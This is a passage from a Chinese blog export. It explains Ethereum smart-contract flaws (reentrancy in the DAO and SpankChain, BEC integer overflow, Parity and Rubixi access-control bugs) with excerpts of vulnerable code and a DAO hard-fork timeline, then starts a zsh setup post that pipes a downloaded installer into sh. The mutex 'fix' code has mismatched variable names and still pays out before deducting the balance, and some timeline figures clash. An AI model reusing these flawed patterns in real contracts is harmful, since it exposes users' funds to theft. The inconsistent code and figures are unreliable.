title="重入解决办法"></a>重入解决办法</h3><p>对于代码层次主要有三种解决方法</p><ol><li><p>使用transfer()、send()，他们默认只能消耗2300gas，无法支付调用函数的费用，无法重入，不过这个时候又碰见一个非常有意思的重入合约<a href="https://paper.seebug.org/801/" target="_blank" rel="noopener">以太坊EIP-1283 sstore 重入漏洞</a>，大佬们真的太牛逼了</p></li><li><p>先扣钱，再发钱；也就是注意执行顺序逻辑</p></li><li><p>引入互斥锁</p></li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">bool reEntrancyMutex = <span class="literal">false</span>;</span><br><span class="line"><span class="comment">//取钱</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span> (<span class="params">uint256 js_money</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">        <span class="built_in">require</span>(userBalances[msg.sender] &gt;= _money);</span><br><span class="line">      <span class="built_in">require</span>(!reEntrancyMutex);</span><br><span class="line">      reEntrancyMutex = <span class="literal">true</span>;</span><br><span class="line">        <span class="built_in">require</span>(msg.sender.call.value(_money)());</span><br><span class="line">        userBalances[msg.sender] -= _weiToWithdraw;</span><br><span class="line">      reEntrancyMutex = <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="重入攻击实例"><a href="#重入攻击实例" class="headerlink" title="重入攻击实例"></a>重入攻击实例</h3><h4 id="著名的DAO攻击事件"><a href="#著名的DAO攻击事件" class="headerlink" title="著名的DAO攻击事件"></a>著名的DAO攻击事件</h4><p>DAO真的非常多人分析过了，我觉得写得特别好的一篇：<a href="https://xz.aliyun.com/t/2905" target="_blank" rel="noopener">区块链安全—THE DAO攻击事件源码分析</a>，推荐大家多看看</p><blockquote><p><a href="[https://forum.qtum.org/topic/135/%E5%88%86%E5%B8%83%E5%BC%8F%E8%87%AA%E6%B2%BB%E7%BB%84%E7%BB%87-the-dao-%E4%BB%A3%E7%A0%81%E8%A7%A3%E6%9E%90](https://forum.qtum.org/topic/135/分布式自治组织-the-dao-代码解析)"><strong>什么是DAO?</strong></a><br>DAO 的全称是 Decentralized Autonomous Organization (去中心化的自治组织)，可理解为完全由计算机代码控制运作的类似公司的实体。 the DAO 本质上是一个风险投资基金，通过以太坊将筹集到的资金锁定在智能合约中，每个参与众筹的人按照出资数额，获得相应的DAO代币(token)，具有审查项目和投票表决的权利。投资议案由全体代币持有人投票表决，每个代币一票。如果议案得到需要的票数支持，相应的款项会划给该投资项目。投资项目的收益会按照一定规则回馈众筹参与人。</p><p>The DAO 是区块链智能合约平台上一场伟大的实验，在2016年4月对外募资，27日内募集了1200万个以太币，价值1.32亿美元，是以太坊史上最大的一次众筹活动。尽管 the DAO 项目最终因递归调用BUG被黑客攻击利用而黯然落幕，但其中的思想仍值得我们学习。</p></blockquote><h5 id="转-DAO漏洞代码分析"><a href="#转-DAO漏洞代码分析" class="headerlink" title="[转]DAO漏洞代码分析"></a>[转]DAO漏洞代码分析</h5><p>这是另一篇分析的比较好的文章，转载到这里：<a href="https://forum.qtum.org/topic/135/分布式自治组织-the-dao-代码解析" target="_blank" rel="noopener">分布式自治组织-the-dao-代码解析</a></p><p>首先，DAO为什么会有这个漏洞，因为在大家投票的时候，用户有权不参与这个基金并且有退出的权利，分裂的方法也比较简单，就是创建一个分裂的DAO，然后想分裂出去的用户需要对这个提议投赞成票，然后在辩论期过后调用splitDAO函数。</p><figure class="highlight js"><figcaption><span>DAO.sol</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 本次分析的是1.0.1版本的代码，也就是产生递归调用BUG的那个版本，请勿在生产环境中使用相同的代码。</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">splitDAO</span>(<span class="params"></span></span></span><br><span class="line"><span class="function"><span class="params">        uint _proposalID, <span class="regexp">//</span>提议id</span></span></span><br><span class="line"><span class="function"><span class="params">        address _newCurator <span class="regexp">//</span> 新的服务提供商地址</span></span></span><br><span class="line"><span class="function"><span class="params">    </span>) <span class="title">noEther</span> <span class="title">onlyTokenholders</span> <span class="title">returns</span> (<span class="params">bool _success</span>) </span>&#123;</span><br><span class="line">        </span><br><span class="line">        ...</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 该用户在分裂前应的收益仍会得到，这一句也是造成bug的关键代码；就是下面这两句代码位置写反了；同事withdrawRewardFor用了没有gas限制的call()函数转账</span></span><br><span class="line">        withdrawRewardFor(msg.sender); <span class="comment">// be nice, and get his rewards       </span></span><br><span class="line">        <span class="comment">// 原Dao的总token发行数减少</span></span><br><span class="line">        totalSupply -= balances[msg.sender];</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 该用户在原 Dao 中的Token清零</span></span><br><span class="line">        <span class="comment">// Token清零应该在转账之前就执行，不应该这样做。</span></span><br><span class="line">        balances[msg.sender] = <span class="number">0</span>;       </span><br><span class="line">        paidOut[msg.sender] = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>看withdrawRewardFor函数</p><figure class="highlight js"><figcaption><span>DAO.sol</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">withdrawRewardFor</span>(<span class="params">address _account</span>) <span class="title">noEther</span> <span class="title">internal</span> <span class="title">returns</span> (<span class="params">bool _success</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> ((balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply &lt; paidOut[_account])</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line"></span><br><span class="line">        uint reward =</span><br><span class="line">            (balanceOf(_account) * rewardAccount.accumulatedInput()) / totalSupply - paidOut[_account];</span><br><span class="line"></span><br><span class="line">        reward = rewardAccount.balance &lt; reward ? rewardAccount.balance : reward;</span><br><span class="line">        <span class="comment">// 从rewardAccount中转移以太到用户账户；</span></span><br><span class="line">  <span class="comment">// withdrawRewrdFor 调用了 rewradAccunt的payOut函数来发送以太</span></span><br><span class="line">        <span class="keyword">if</span> (!rewardAccount.payOut(_account, reward))</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">        paidOut[_account] += reward;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><figure class="highlight js"><figcaption><span>ManagedAccount.sol</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">payOut</span>(<span class="params">address _recipient, uint _amount</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (msg.sender != owner || msg.value &gt; <span class="number">0</span> || (payOwnerOnly &amp;&amp; _recipient != owner))</span><br><span class="line">            <span class="keyword">throw</span>;</span><br><span class="line">            </span><br><span class="line">        <span class="comment">// 如果_recipient是一个合约账户，且定义了默认函数function () &#123;&#125;, 将会触发此函数</span></span><br><span class="line">        <span class="comment">// 而且这一句没有限制gas数，进一步给了漏洞可乘之机</span></span><br><span class="line">        <span class="keyword">if</span> (_recipient.call.value(_amount)()) &#123;</span><br><span class="line">        </span><br><span class="line">            PayOut(_recipient, _amount);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>创建一个钱包合约，并设置它的默认函数功能为调用 Dao 合约的 splitDAO 函数若干次，<br>接着我们为这个钱包合约发起一个分裂 Dao 的提议，投票表决期过后，执行 splitDAO 。这时便会触发递归调用漏洞。<br>此时的函数栈看起来就是这个样子，主 Dao 中的资金便会被黑客偷走。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">splitDao</span><br><span class="line">     withdrawRewardFor</span><br><span class="line">        payOut</span><br><span class="line">           recipient.call.value()()</span><br><span class="line">              splitDao</span><br><span class="line">                withdrawRewardFor</span><br><span class="line">                   payOut</span><br><span class="line">                      recipient.call.value()()</span><br><span class="line">                      ...递归下去</span><br></pre></td></tr></table></figure><h5 id="DAO攻击后续解决"><a href="#DAO攻击后续解决" class="headerlink" title="DAO攻击后续解决"></a>DAO攻击后续解决</h5><p>由于这个攻击涉及的金额太大，因此，引发了以太坊历史上的著名硬分叉</p><p>参考文章，摘录整合部分如下</p><p><a href="https://learnblockchain.cn/2019/04/07/dao/#SOHUCS" target="_blank" rel="noopener">以太坊 DAO 攻击解决方案代码解析</a></p><p><a href="https://www.8btc.com/article/97819" target="_blank" rel="noopener">以太坊分叉始末</a></p><p><a href="https://juejin.im/post/5b28ffdef265da59bc2ca147" target="_blank" rel="noopener">the DAO攻击事件2周年祭</a></p><blockquote><p>2016年4月30日，The DAO上线开始为期28天的全球众筹；</p><p>2016年5月10日，10天时间融得以太币的价值已达到3400万美元；</p><p>2016年5月15日，众筹金额超过1亿美元；</p><p>2016年5月28日，众筹结束，融得超过1150万个以太币，相当于超过1.5亿美元价值，成为全球历史上最大金额众筹项目。同日，The DAO开始在各大数字货币交易所进行开放交易；</p><p>2016年6月9日，以太坊开发人员Peter Vessenes指出The DAO存在递归调用漏洞,；</p><p>2016年6月14日，修复方案被提交，等到The DAO成员的审核；</p><p>2016年6月16日，递归调用问题再次被提及；</p><p>2016年6月17日，黑客发起针对The DAO智能合约多个漏洞的攻击，其中也包含了递归调用漏洞，并向一个匿名地址转移了3600w个以太币，几乎占据了The DAO众筹总量1150w的三分之一。受制于The DAO的28天锁定期原则，黑客需要等到7月14日才能对这部分资金进行转移。当天以太坊停止了对所有交易的验证，此行为被社区诟病为“中心化”干涉，违背区块链本意；同时以太币币价大跌，一举从145元人民币跌落至68元人民币。</p><p>2016年6月18日，开放交易验证后，社区号召大家通过发送大量垃圾交易阻塞交易验证的形式减缓黑客的继续偷盗；同时白帽通过使用与黑客同样的方法将剩余2/3未被盗取资金转移到安全账户；</p><p>2016年6月24日，以太坊社区提交了<strong>软分叉提案</strong>（软分叉版本Gethv1.4.8），希望通过阻止所有人从The DAO中提取资金，为找回被盗资金争取时间；方案发布后黑客攻击者暂停了攻击，宣布对不支持软分叉的矿工给与100万以太币和100比特币奖励。</p><p>2016年6月28日，Felix Lange指出软分叉提案存在DoS攻击风险，简单地说，每个以太坊上的交易，验证节点（矿工）都会检查是否与TheDAO智能合约及其子DAO的地址相关。如果是则拒绝这个交易，从而锁定TheDAO（包括黑客在内）的所有资金。这个逻辑实现本身并没有问题，但是却没有收取执行交易的手续费，这就像节假日高速免费一样，导致以太坊成为了DoS的攻击目标，攻击者可以零成本发起大量交易，导致以太坊网络瘫痪，由此各个节点回滚了软件版本，<strong>软分叉方案宣告失败</strong>。以太币币价从逐渐回升到的96元人民币再次下跌至76元，并进入下跌通道。</p><p>2016年6月30日，<strong>软分叉失败后只能进行硬分叉</strong>。以太坊创始人Vitalik Buterin提出硬分叉设想；</p><p>2016年7月15日，具体硬分叉方案公布，<strong>建立退币合约</strong>，但7月21日之后黑客将可以进一步通过分离创造子The DAO，造成所盗取资金不被退币合约影响。因此7月21日将成为硬分叉执行的最终期限。软件提供硬分叉开关，选择权则交给社区。支持分叉的矿工会在 X 区块到 X+9 区块出块时，在区块 <code>extradata</code> 字段中写入 <code>0x64616f2d686172642d666f726b</code>（“dao-hard-fork” 的十六进制数）。从分叉点开始，如果连续 10 个区块均有硬分叉投票，则表示硬分叉成功。<strong>程序预设在1920000个区块时进行切换</strong>；</p><p>2016年7月20日晚，备受瞩目的以<strong>太坊区块链硬分叉已成功实施</strong>，BW.com成功挖得以太坊第192,000个区块，几秒钟过后，该矿池还挖到了新区块链的首个区块。也预示着由未知黑客持有的价值约4000万美元的以太币，已被转移到了一个新的地址( <strong>这就是上述的退币合约<a href="https://etherscan.io/address/0xbf4ed7b27f1d666546e30d74d50d173d20bca754" target="_blank" rel="noopener">0xbf4ed7b27f1d666546e30d74d50d173d20bca754</a></strong>)，从而“夺回”黑客所控制的DAO合约的币。从而形成两条链，一条为原链（<strong>ETC</strong>），一条为新的分叉链（<strong>ETH</strong>），各自代表不同的社区共识以及价值观。</p><p>2016年7月21日，最终有大约450万以太币参与了投票，近90%表示同意硬分叉，硬分叉成功。</p></blockquote><p>而今我们提到以太坊，一般都指ETH，同源不同命啊~不过今年ETC貌似在卯足了劲要干一票大的呢</p><h4 id="SpankChain重入漏洞"><a href="#SpankChain重入漏洞" class="headerlink" title="SpankChain重入漏洞"></a>SpankChain重入漏洞</h4><p>看文！<a href="https://bcsec.org/index/detail/tag/1/id/305" target="_blank" rel="noopener">SpankChain重入漏洞分析</a></p><p>其实通篇看下来，也是等同于DAO的思路，但是捏，非常有意思的是，它之所以产生这个漏洞并不是因为使用了call这个危险函数，这里截取文中一段话来说明就可以了</p><p><img src="https://i.loli.net/2020/04/02/ZrKTOchFw3sDLBo.png" alt="LCOpenTimeout函数"></p><blockquote><p><del>于是攻击者可以通过自己部署的使用<strong>createChannel</strong>函数创建一个支付通道，在确认时间超出之后，使用自己部署的合约去调用支付通道的<strong>LCOpenTimeou</strong>函数，然后支付通道合约向恶意合约转账，触发恶意合约的fallback函数，接着又触发攻击者在恶意合约fallbck函数中调用的<strong>LCOpenTimeou</strong>函数，形成重入循环…</del></p><p>更新，经过PeckShield团队友情提醒，上述描述存在一处错误，向大家道歉！<strong>正确的结论如下：</strong></p><p>尽管是在进行转账之后更新的状态，但是上面的代码要形成重入也又一定难度，看第一个红框中的代码，因为该函数里进行ETH转账不是使用的call.value，而是使用的transfer，使用transfer只能消耗2300 GAS，无法构成重入，这也是SpankChain与TheDAO不同的点。</p><p>再看第二个红框，其中调用了token的transfer函数，而token是攻击者可控的，调用token合约的transfer函数不会有2300 GAS限制！于是攻击者可以在自己部署的恶意token合约的transfer函数中调用支付通道合约的<strong>LCOpenTimeout</strong>函数，形成重入循环…</p></blockquote><h4 id="EIP-1283-sstore导致的重入问题"><a href="#EIP-1283-sstore导致的重入问题" class="headerlink" title="EIP-1283 sstore导致的重入问题"></a>EIP-1283 sstore导致的重入问题</h4><p>请观赏大佬的repo：<a href="https://paper.seebug.org/801/" target="_blank" rel="noopener">https://paper.seebug.org/801/</a></p><p>还有这个大佬：<a href="https://www.jianshu.com/p/d543dab6267c" target="_blank" rel="noopener">https://www.jianshu.com/p/d543dab6267c</a></p><p>这个漏洞真的是在无中生有Orz，首先要了解EIP1283这个分叉是用来干嘛的：可以认为是对sstore收费的一个变更，相当于使得收费更合理，但是呢，因为变更SSTORE的收费机制，所以导致transfer突然可以作妖。</p><blockquote><p>安全的合约会使用transfer进行转账，transfer转账最多消耗2300 gas，在EIP 1283生效之前对变量进行更改再重置至少需要15000 gas，而生效后只需要400 gas，2300 gas上限已经足够做一些事情了。</p></blockquote><p>从DAO软分叉失败到EIP1283导致transfer产生漏洞来看，每一个变更都需要非常小心，稍有不慎就没有回头路了（手动狗头）。</p><h2 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h2><p>首先，EVM所能支持的取值就是256位可以表达的范围；如果通过操作超出上限或者下限，就会导致结果不可控；溢出这个在以前的漏洞中也没有那么大的危害，主要是因为可修改；但是区块链上链了就动不了了，所以问题被放大了很多；其实原理真的太简单，不说了；</p><h3 id="整数溢出实例"><a href="#整数溢出实例" class="headerlink" title="整数溢出实例"></a>整数溢出实例</h3><h4 id="BEC-智能合约无限转币漏洞分析及预警"><a href="#BEC-智能合约无限转币漏洞分析及预警" class="headerlink" title="BEC 智能合约无限转币漏洞分析及预警"></a><a href="https://mp.weixin.qq.com/s?__biz=MzU4ODQ3NTM2OA==&mid=2247483736&idx=1&sn=e7108ba027569def9b5636e589e56e7e&chksm=fddd7fdfcaaaf6c99ed85e93def72e6e19880ebd37b995d9e75c27bcca5c28a79ba01bb54e77&scene=21#wechat_redirect" target="_blank" rel="noopener"><strong>BEC 智能合约无限转币漏洞分析及预警</strong></a></h4><p><img src="https://i.loli.net/2020/04/02/cltnCeKY2LkNWI8.png" alt="有问题的代码"></p><p>先解释下这个合约，合约本意，给<code>_receivers</code>数组的每个账户转入<code>_value</code>的价值，先扣除<code>cnt*_value</code>的值，再逐一将<code>_value</code>打入<code>_receivers</code>数组的每个账户；但是这个函数偷懒了，没使用safemath的mul函数，事实上，还是比较容易忘使用的…毕竟一个顺手就。。。那么<code>cnt=2，_value=2^255</code>的情况下，而将<code>cnt</code>和<code>_value</code>两者相乘，结果为<code>2^256</code>，刚好超过uint256的范围，溢出之后amount的结果为0，成功实现空手套白狼，完美。</p><p>感受下这个空手套狼，<a href="https://etherscan.io/tx/0xad89ff16fd1ebe3a0a7cf4ed282302c06626c1af33221ebe0d3a470aba4a660f" target="_blank" rel="noopener">交易地址</a></p><img src="https://i.loli.net/2020/04/02/SOvqGmf41D8BArl.png" alt="input-data" style="zoom:60%"><p><img src="https://i.loli.net/2020/04/02/jiGXVJ3pbvE54fM.png" alt="解析后的input-data"></p><p>总体来说大部分溢出攻击都是uint256上溢。</p><h4 id="更多整数溢出实例"><a href="#更多整数溢出实例" class="headerlink" title="更多整数溢出实例"></a>更多整数溢出实例</h4><p><a href="https://blog.noneage.com/以太坊智能合约漏洞实战详解：整数溢出攻击/" target="_blank" rel="noopener">以太坊智能合约漏洞实战详解：整数溢出攻击</a>：这篇主要介绍BEC、SMT、FNT的整数溢出漏洞</p><p><a href="https://www.anquanke.com/post/id/147913" target="_blank" rel="noopener">ERC20智能合约整数溢出系列漏洞披露</a>：这篇牛逼了，介绍了好多个，就是可惜表格居然是图片，搞得我复现它们的时候还得先转文字获取地址。</p><h3 id="整数溢出的解决办法"><a href="#整数溢出的解决办法" class="headerlink" title="整数溢出的解决办法"></a>整数溢出的解决办法</h3><p>源码角度来说，可能还是需要自己做判断，或者使用安全库函数，SafeMath库我看还是蛮多人用的，但是还是要小心，可能一不小心就忘了，毕竟和我们平时写代码不太一样，可能一不留神就写了个+号，而不是安全的add函数。</p><p>比如Beauty Chain的合约代码中使用了SafeMath库，但是在一个*操作处没有使用SafeMath库中的mul方法进行限制导致了近60亿人民币的损失。具体出问题的代码片段如下：</p><p><img src="https://i.loli.net/2020/04/02/ZNwWh1avIipAs2k.png" alt="有问题的代码"></p><h2 id="访问控制"><a href="#访问控制" class="headerlink" title="访问控制"></a>访问控制</h2><p>Solidity 中除了常规的变量和函数可见性描述外，这里还需要特别提到的就是两种底层调用方式 <code>call</code> 和 <code>delegatecall</code>：</p><ul><li><code>call</code> 的外部调用上下文是外部合约</li><li><code>delegatecall</code> 的外部调用上下是调用合约上下文</li></ul><p>简单的用图表示就是：</p><p><img src="https://i.loli.net/2020/04/02/OsuVm7ApzXhQFH4.png" alt="“call delegatecall”的区别"></p><p>如果S通过合约A使用delegatecall调用了合约B中改变合约owner的函数，那合约A的主人就可以变成S了；基本原理就是这么简单；但是影响可是很大的。</p><p>其实delegatecall的话呢，还会引起很多问题，主要是在存储空间上，可能会产生冲突，不细说，可以看看<a href="https://ethfans.org/posts/comprehensive-list-of-common-attacks-and-defense-part-2#2.%20Delegatecall" target="_blank" rel="noopener">DelegateCall</a></p><h3 id="访问控制攻击实例"><a href="#访问控制攻击实例" class="headerlink" title="访问控制攻击实例"></a>访问控制攻击实例</h3><p>访问控制包括</p><ul><li><p>由于不当使用delegatecall导致的问题</p></li><li><p>写错了构造函数，比如大小写没注意，单词拼错了等等，不过这些是低版本错误了，高版本直接使用constructor关键字了，具体漏洞看Rubixi</p></li></ul><blockquote><p>Access Control issues are common in all programs, not just smart contracts. In fact, it’s <a href="https://www.owasp.org/images/7/72/OWASP_Top_10-2017_(en).pdf.pdf" target="_blank" rel="noopener">number 5 on the OWASP top 10</a>. One usually accesses a contract’s functionality through its public or external functions. While insecure <strong>visibility</strong> settings give attackers straightforward ways to access a contract’s private values or logic, access control bypasses are sometimes more subtle. These vulnerabilities can occur when contracts use the deprecated <code>tx.origin</code> to validate callers, handle large authorization logic with lengthy <code>require</code> and make reckless use of <code>delegatecall</code> in <a href="https://blog.zeppelin.solutions/proxy-libraries-in-solidity-79fbe4b970fd" target="_blank" rel="noopener">proxy libraries</a> or <a href="https://blog.indorse.io/ethereum-upgradeable-smart-contract-strategies-456350d0557c" target="_blank" rel="noopener">proxy contracts</a>.</p><p><strong>Loss</strong>: estimated at 150,000 ETH (~30M USD at the time)</p><p>转载自DASP TOP 10</p></blockquote><h4 id="Parity-第一次安全事件漏洞分析"><a href="#Parity-第一次安全事件漏洞分析" class="headerlink" title="Parity 第一次安全事件漏洞分析"></a>Parity 第一次安全事件漏洞分析</h4><p><a href="https://www.chaindd.com/3097308.html" target="_blank" rel="noopener">详细分析</a></p><p><a href="https://github.com/paritytech/parity-ethereum/blob/4d08e7b0aec46443bf26547b17d10cb302672835/js/src/contracts/snippets/enhanced-wallet.sol" target="_blank" rel="noopener">源码</a></p><p><a href="https://blog.csdn.net/xuguangyuansh/article/details/80786691?utm_source=distribute.pc_relevant.none-task" target="_blank" rel="noopener">以太坊安全之 Parity 第一次安全事件漏洞分析</a></p><p>具体来说，就是Parity多签是一个库合约，但是这个库合约没写好，有一个函数使用了delegatecall来调用代码: <code>_walletLibrary.delegatecall(msg.data);</code>，而Parity多签合约初始化的时候会调用initWallet函数，initWallet 函数可以改变合约的 owner。</p><p>连起来就是，攻击者通过控制msg.data使得它能以自己的身份调用到initWallet函数，从而改变合约所有者，以Owner身份转走合约里面的钱。</p><p>防范的话呢，就是对initWallet的初始化状态进行判断，如果已经初始化过了呢，就不能调用initWallet。</p><h4 id="Parity-第二次安全事件漏洞分析"><a href="#Parity-第二次安全事件漏洞分析" class="headerlink" title="Parity 第二次安全事件漏洞分析"></a>Parity 第二次安全事件漏洞分析</h4><p>这个可以认为是拒绝服务，也可以认为是越权访问漏洞。这次直接玩崩了它</p><blockquote><p>这次的问题就出现在黑客直接调用了库合约的初始化函数，由于库合约本质上也不过是另一个智能合约，这次攻击调用使用的就是库合约本身的上下文，对于调用者而言，这个库合约是未经初始化的，而黑客通过初始化参数把自己设置的成了 owner，接下来又作为 owner 调用了 kill 函数，抹除了库合约的所有代码，这样所有依赖这个库合约的用户多签合约就都无法执行，而合约中的代币全部被锁在合约内无法转移。</p><p>转载自：<a href="https://blog.csdn.net/xuguangyuansh/java/article/details/81070173" target="_blank" rel="noopener">https://blog.csdn.net/xuguangyuansh/java/article/details/81070173</a></p></blockquote><p><img src="https://i.loli.net/2020/04/02/auMvigT5OoeZsfp.png" alt="parity人间惨剧"></p><p><a href="http://paritytech.io/a-postmortem-on-the-parity-multi-sig-library-self-destruct/" target="_blank" rel="noopener">http://paritytech.io/a-postmortem-on-the-parity-multi-sig-library-self-destruct/</a></p><h4 id="Rubixi"><a href="#Rubixi" class="headerlink" title="Rubixi"></a>Rubixi</h4><blockquote><p>ETH 圈的某家公司将公司名从 <em>Dynamic Pyramid</em> 改为了 <em>Rubixi</em>，但他们只修改了合约的名字而忘记修改构造函数的名字，结果就恰好发生了像本题所示的情况：所有人都能调用失控的构造函数！然后大家就开始了愉快的抢 owner 游戏 :)</p><p>转：<a href="https://xz.aliyun.com/t/2856" target="_blank" rel="noopener">https://xz.aliyun.com/t/2856</a></p></blockquote><p>Rubxi地址：<a href="https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code" target="_blank" rel="noopener">https://etherscan.io/address/0xe82719202e5965Cf5D9B6673B7503a3b92DE20be#code</a></p><!-- rebuild by neat -->]]></content>
      
      
      <categories>
          
          <category> BlockChain </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SmartContract </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac下iTerm终端配置+zsh</title>
      <link href="/2019/12/08/iTermplusZsh/"/>
      <url>/2019/12/08/iTermplusZsh/</url>
      
        <content type="html"><![CDATA[<!-- build time:Mon Apr 20 2020 11:02:23 GMT+0800 (中国标准时间) --><p>记录下来，以后好找，碰到的相关问题</p><a id="more"></a><p>关于iterm配置，很多博客都讲了，但是配置真的遇到了不少问题，我记录下，以后省得再去翻翻找找。</p><h2 id="iterm主题"><a href="#iterm主题" class="headerlink" title="iterm主题"></a>iterm主题</h2><p><a href="https://github.com/mbadolato/iTerm2-Color-Schemes" target="_blank" rel="noopener">https://github.com/mbadolato/iTerm2-Color-Schemes</a></p><p>有预览，下载后在iterms下面import一下<a href="https://github.com/mbadolato/iTerm2-Color-Schemes/tree/master/schemes" target="_blank" rel="noopener">schemes</a>的文件，我比较喜欢的是Tomrrow night，</p><img src="https://i.loli.net/2019/12/08/gGQFtfiuPMkHeLI.png" alt="image-20191208142606872" style="zoom:50%"><p><strong>背景和透明度自调</strong></p><h2 id="下拉式终端配置"><a href="#下拉式终端配置" class="headerlink" title="下拉式终端配置"></a>下拉式终端配置</h2><img src="https://i.loli.net/2019/12/08/5Oab3LrDJojXCkQ.png" alt="配置方式" style="zoom:50%"><h2 id="zsh配置"><a href="#zsh配置" class="headerlink" title="zsh配置"></a>zsh配置</h2><p>这个主要是参考了<a href="https://blog.biezhi.me/2018/11/build-a-beautiful-mac-terminal-environment.html" target="_blank" rel="noopener">打造 Mac 下高颜值好用的终端环境</a></p><p><code>brew install zsh</code></p><p>(多提一句，这个最好挂代理，不然真的很慢，，，要么，就换国内源，不然。。。)</p><p>修改默认bash为zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sh -c <span class="string">"echo <span class="variable">$(which zsh)</span> &gt;&gt; /etc/shells"</span> </span><br><span class="line">chsh -s $(<span class="built_in">which</span> zsh)</span><br></pre></td></tr></table></figure><p>安装oh-my-zsh</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.githubusercontent.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure><p>此后，我们的配置就在『~/.zshrc』了</p><h3 id="zsh配置主题和字体"><a href="#zsh配置主题和字体" class="headerlink" title="zsh配置主题和字体"></a>zsh配置主题和字体</h3><p>将主题下载到本地的主题目录中：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/bhilburn/powerlevel9k.git ~/.oh-my-zsh/custom/themes/powerlevel9k</span><br></pre></td></tr></table></figure><p>然后修改 <code>zsh</code> 主题配置：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ZSH_THEME=<span class="string">"powerlevel9k/powerlevel9k"</span></span><br></pre></td></tr></table></figure><p>当然，其实也可以换一个主题，这个就是坐着介绍的那个字体</p><p><img src="https://blog-biezhi-me-1251171175.cos.ap-shanghai.myqcloud.com/public/images/2018/11/sankey-glyphs-combined-diagram.svg" alt="nerd-fonts"></p><p>使用 brew 安装</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew tap caskroom/fonts</span><br><span class="line">brew cask install font-hack-nerd-font</span><br></pre></td></tr></table></figure><blockquote><p>注意：安装的时候会去 Github 下载字体，如果你下载失败可能是被墙了。</p><p>那么可以通过 <code>https_proxy=127.0.0.1:1087 brew cask reinstall font-hack-nerd-font</code> 的方式安装，前提是你开启了代理。</p></blockquote><p>安装成功后需要在 iTerm2 中配置一下，在 <code>iTerm2 -&gt; Preferences -&gt; Profiles -&gt; Text -&gt; Font -&gt; Change Font</code> 栏位中，Text 下面勾选 <code>Use a different font for non-ASCII text</code>，然后在 <code>Non-ASCII font</code> 点击 <code>Change font</code> 修改：</p><img src="https://i.loli.net/2019/12/08/Zet1wsmNSzd9M3O.png" alt="image-20191208143241716" style="zoom:50%"><p>然后配置.zshrc，要注意，以前.bash_profile配置的alias和path都要copy过来。</p><figure class="highlight bash"><table><tr><td 